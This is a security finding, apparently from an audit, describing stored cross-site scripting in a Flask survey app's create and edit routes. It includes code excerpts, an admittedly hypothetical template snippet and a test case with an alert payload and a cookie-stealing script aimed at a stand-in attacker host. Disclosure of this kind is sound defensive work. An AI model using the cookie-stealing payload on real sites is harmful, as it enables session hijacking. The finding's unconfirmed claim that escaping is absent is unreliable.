### Vulnerability List

* Vulnerability Name: Stored Cross-Site Scripting (XSS) in Survey Creation

* Description:
    1. An attacker can create a new survey or edit an existing survey through the web interface.
    2. In the survey creation/edit form, the attacker inputs malicious JavaScript code into one of the survey fields, such as question text or answer text.
    3. The application stores this malicious script in the Firestore database without sanitization.
    4. When a user (either an administrator previewing the survey or an end-user taking the survey) accesses the survey, the application retrieves the survey data from Firestore.
    5. The application renders the survey using the `creative.html` template, directly embedding the unsanitized survey data, including the malicious script, into the HTML.
    6. The user's browser executes the embedded malicious script, leading to Stored XSS.

* Impact:
    - Account Takeover: An attacker could potentially steal administrator or user session cookies, leading to account hijacking.
    - Data Theft: Malicious scripts can access sensitive data accessible to the user, and transmit it to a third-party server controlled by the attacker.
    - Defacement: The attacker could modify the content of the survey page or redirect users to malicious websites.
    - Further attacks: XSS can be a stepping stone for more complex attacks, such as phishing or malware distribution.

* Vulnerability Rank: High

* Currently Implemented Mitigations:
    - Basic Authentication: The application uses basic authentication (`flask-basicauth`) to protect access to the survey creation and management interface. This is configured in `main.py` using environment variables `AUTH_USERNAME` and `AUTH_PASSWORD`. However, this is not a sufficient mitigation for XSS as it only restricts access to the admin interface, but doesn't prevent XSS if an authenticated user injects malicious code.

* Missing Mitigations:
    - Input Sanitization/Escaping: The application lacks proper input sanitization or output escaping for user-provided survey content. Specifically, it needs to sanitize or escape HTML special characters and JavaScript code within the survey questions and answers before storing them in the database and before rendering them in HTML templates.
    - Content Security Policy (CSP): Implementing a Content Security Policy (CSP) would help mitigate the impact of XSS by restricting the sources from which the browser is allowed to load resources, and by disallowing inline JavaScript.

* Preconditions:
    - Access to the survey creation/edit interface: An attacker needs to be able to access the survey creation or edit pages. This is currently protected by basic authentication. If the attacker has valid credentials or can bypass the authentication, they can exploit this vulnerability.

* Source Code Analysis:
    1. **File: `/code/creative/app/main.py` - Route `/survey/create` and `/survey/edit`**:
        - The `create()` and `edit()` functions handle survey creation and editing.
        - They use `forms.QuestionForm()` to process user input.
        - `survey_service.create(form)` and `survey_service.update_by_id(docref_id, form)` are called to store the survey data.
        - **Crucially, there is no input sanitization performed on the form data before it is passed to `survey_service` and stored in the database.**

    ```python
    @app.route('/survey/create', methods=['GET', 'POST'])
    def create():
      """Survey creation."""
      form = forms.QuestionForm()
      if form.validate_on_submit():
        survey_service.create(form) # No sanitization here
        return redirect(url_for('index'))
      return render_template('questions.html', title='Survey Creation', form=form)


    @app.route('/survey/edit', methods=['POST', 'PUT', 'GET'])
    def edit():
      """Edit Survey."""
      form = forms.QuestionForm()
      docref_id = request.args.get('survey_id')
      edit_doc = survey_service.get_doc_by_id(docref_id)
      if request.method == 'GET':
        survey_service.set_form_data(form, edit_doc)
      if form.validate_on_submit():
        survey_service.update_by_id(docref_id, form) # No sanitization here
        return redirect(url_for('index'))
      return render_template('questions.html', form=form)
    ```

    2. **File: `/code/creative/app/survey_service.py` - Function `get_html_template`**:
        - This function is responsible for rendering the `creative.html` template.
        - It passes `survey_dict` (which contains the survey data retrieved from Firestore) directly to the `render_template` function.
        - **No output escaping is performed on `survey_dict` before rendering. This means that any malicious JavaScript code stored in the survey data will be directly embedded into the HTML output without being escaped.**

    ```python
    def get_html_template(survey_id, survey_dict, seg_type):
      return render_template(
          'creative.html',
          survey=survey_dict, # Unsanitized survey data passed to template
          survey_id=survey_id,
          show_back_button=False,
          all_question_json=get_question_json(survey_dict),
          seg=seg_type,
          thankyou_text=get_thank_you_text(survey_dict),
          next_text=get_next_text(survey_dict),
          comment_text=get_comment_text(survey_dict))
    ```

    3. **File: `/code/creative/app/templates/creative.html` - Template rendering**:
        - The `creative.html` template likely uses Jinja2 templating to display the survey data.
        - If the template uses constructs like `{{ survey.question1 }}` directly, it will render the content of `survey.question1` without escaping.
        - **By default, Jinja2 auto-escaping is enabled for HTML context but it depends on the usage in the template. Even with auto-escaping, there might be contexts where it's not effective, or developers might have disabled it.**

    ```html+jinja
    {# Example snippet from creative.html (Hypothetical) #}
    <div>
        <p>{{ survey.question1 }}</p>  {# Potentially vulnerable if not escaped properly #}
        {# ... rest of the template ... #}
    </div>
    ```

    **Visualization:**

    ```
    User (Attacker) --> Survey Creation Form --> main.py (create/edit route) --> survey_service.py (create/update) --> Firestore (Stores malicious script)
    User (Viewer) --> /survey/preview/<survey_id> or Survey Execution --> main.py (preview route) --> survey_service.py (get_html_template) --> creative.html (Renders unsanitized data) --> User Browser (XSS execution)
    ```

* Security Test Case:
    1. **Precondition:** Ensure you have access to the Brandometer application with valid basic authentication credentials to create or edit surveys.
    2. **Login:** Access the Brandometer application's survey management interface and log in using the basic authentication credentials.
    3. **Create or Edit Survey:**
        - Navigate to the survey creation page ("/survey/create") or edit an existing survey ("/survey/edit?survey_id=[existing_survey_id]").
        - In the survey form, locate the "Question 1" field.
        - Input the following malicious payload into the "Question 1" field:
          ```html
          <img src="x" onerror="alert('XSS Vulnerability Detected!')">
          ```
          Alternatively, you can use a more harmful payload like:
          ```html
          <script>document.location='http://attacker.com/cookie_stealer.php?cookie='+document.cookie</script>
          ```
          Replace `http://attacker.com/cookie_stealer.php` with a URL you control to capture cookies.
        - Fill out the rest of the required fields in the survey form to ensure it can be submitted.
        - Submit the survey form.
    4. **Preview Survey:**
        - After successfully creating or editing the survey, navigate to the survey preview page: "/survey/preview/[survey_id]" (replace `[survey_id]` with the actual survey ID of the survey you just created or edited).
    5. **Verify XSS:**
        - Observe if an alert box pops up with the message "XSS Vulnerability Detected!". If you used the `<script>` payload, check if a request is sent to `http://attacker.com/cookie_stealer.php` with the document's cookies.
        - If the alert box appears or the cookie stealer is triggered, it confirms that the Stored XSS vulnerability exists.

This test case demonstrates that malicious JavaScript code injected into the survey question is executed when the survey is previewed, confirming the Stored XSS vulnerability.
